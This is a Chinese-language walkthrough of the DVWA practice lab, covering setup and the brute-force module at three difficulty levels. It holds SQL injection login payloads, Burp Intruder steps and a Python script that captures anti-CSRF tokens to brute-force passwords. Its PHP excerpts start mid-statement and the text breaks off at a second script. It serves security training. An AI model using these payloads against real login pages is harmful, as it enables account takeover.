# DVWA-WalkThrough
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
**靶场项目地址**
- https://github.com/ethicalhack3r/DVWA
**知识点**
- [暴力破解](#brute_force)
- [命令执行](#command_injection)
- [CSRF](#csrf)
- [文件包含](#file_inclusion)
- [文件上传](#file_upload)
- [验证码绕过](#insecure_captcha)
- [SQL 注入](#sql_injection)
- [SQL 注入(盲注)](#sql_injection(blind))
- [Session 绕过](#weak_session_ids)
- [XSS](#xss)
- [CSP Bypass](#csp_bypass)
- [JS 攻击](#javascript_attacks)
**实验环境**
`环境仅供参考`
- phpstudy(可以测试 `%00` 截断,你还可以顺便测试 Phpstudy 后门)
- Microsoft Windows 10 企业版 LTSC - 10.0.17763
- dvwa Version 1.10 *Development* (Release date: 2015-10-08)
- VMware® Workstation 15 Pro - 15.0.0 build-10134415
- kali 4.19.0-kali3-amd64
---
## 搭建/使用
**windows**
推荐用 [phpstudy](http://phpstudy.php.cn/) 进行快速搭建
修改 config.inc.php,配置数据库密码 `$_DVWA[ 'db_password' ] = 'root';`
> 登录 Login URL: http://127.0.0.1/dvwa/login.php
> 账号密码: admin/password
**难度**
**取消登录**
更改文件：\dvwa\includes\dvwaPage.inc.php
更改方法：注释即可 `//dvwaRedirect( DVWA_WEB_PAGE_TO_ROOT.'login.php' );`
---
## Brute_Force
Brute Force,即暴力(破解),是指黑客利用密码字典,使用穷举法猜解出用户口令
### Low
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];
		// Login successful
		$html .= "Welcome to the password protected area {$user}";
		$html .= "";
	}
	else {
		// Login failed
		$html .= "Username and/or password incorrect.";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
可以看到,服务器只是验证了参数 Login 是否被设置(isset 函数在 php 中用来检测变量是否设置,该函数返回的是布尔类型的值,即 true/false),没有任何的防爆破机制,且对参数 username、password 没有做任何过滤,存在明显的 sql 注入漏洞.
**利用爆破 burpsuite**
0. burp 的安装过程略
1. 抓包
2. ctrl+I 将包复制到 intruder 模块,因为要对 password 参数进行爆破,所以在 password 参数的内容两边加 $
3. 选中 Payloads,载入字典,点击 Start attack 进行爆破
4. 最后,尝试在爆破结果中找到正确的密码,可以看到 password 的响应包长度(length)"与众不同",可推测 password 为正确密码,手工验证登录成功.
**手工 sql 注入**
1. Username : admin' or '1'='1 Password :(空),此时 sql 语句如下图:
2. Username :admin' # Password :(空),此时 sql 语句如下图:
### Medium
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];
		// Login successful
		$html .= "Welcome to the password protected area {$user}";
		$html .= "";
	}
	else {
		// Login failed
		sleep( 2 );
		$html .= "Username and/or password incorrect.";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
相比 Low 级别的代码,Medium 级别的代码主要增加了 mysql_real_escape_string 函数,这个函数会对字符串中的特殊符号(x00,n,r,,’,",x1a)进行转义,基本上能够抵御 sql 注入攻击,但 MySQL5.5.37 以下版本如果设置编码为 GBK,能够构造编码绕过 mysql_real_escape_string 对单引号的转义(因实验环境的 MySQL 版本较新,所以并未做相应验证);同时,$pass 做了 MD5 校验,杜绝了通过参数 password 进行 sql 注入的可能性.但是,依然没有加入有效的防爆破机制(sleep(2)实在算不上).
具体的 mysql_real_escape_string 函数绕过问题详见
- [PHP防SQL注入不要再用addslashes和mysql_real_escape_string了](https://web.archive.org/web/20171107192133/https://blog.csdn.net/hornedreaper1988/article/details/43520257)
- [PHP字符编码绕过漏洞总结](http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html)
- [mysql_real_escape_string() versus Prepared Statements](https://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html)
虽然sql注入不再有效,但依然可以使用 Burpsuite 进行爆破,与 Low 级别的爆破方法基本一样,这里就不赘述了.
### High
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];
		// Login successful
		$html .= "Welcome to the password protected area {$user}";
		$html .= "";
	}
	else {
		// Login failed
		sleep( rand( 0, 3 ) );
		$html .= "Username and/or password incorrect.";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```
High级别的代码加入了 Token,可以抵御 CSRF 攻击,同时也增加了爆破的难度,通过抓包,可以看到,登录验证时提交了四个参数:username、password、Login 以及 user_token.
每次服务器返回的登录页面中都会包含一个随机的 user_token 的值,用户每次登录时都要将 user_token 一起提交.服务器收到请求后,会优先做 token 的检查,再进行 sql 查询.
同时,High 级别的代码中,使用了 stripslashes(去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个)、 mysql_real_escape_string 对参数 username、password 进行过滤、转义,进一步抵御 sql 注入.
**使用 python 脚本爆破**
`适用于老版本 dvwa 环境`
```python
from bs4 import BeautifulSoup
import urllib2
header={
        'Host': '',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http:///dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'
        }
requrl = "http:///dvwa/vulnerabilities/brute/"
def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
	soup = BeautifulSoup(the_page,"html.parser")
	user_token = soup.form.input.input.input.input["value"] # get the user_token
	return user_token
user_token = get_token(requrl,header)
i=0
for line in open("password.txt"):
	requrl = "http:///dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print i,'admin',line.strip(),
	user_token = get_token(requrl,header)
	if (i == 10):
		break
```
get_token 的功能是通过 python 的 BeautifulSoup 库从 html 页面中抓取 user_token 的值,为了方便展示,这里设置只尝试 10 次.
注:在最新版本中,由于 hard 难度的源代码修改,无法直接使用 BeautifulSoup 匹配 user_token 值,在此给出我略微修改的版本
```python
import requests, re
from bs4 import BeautifulSoup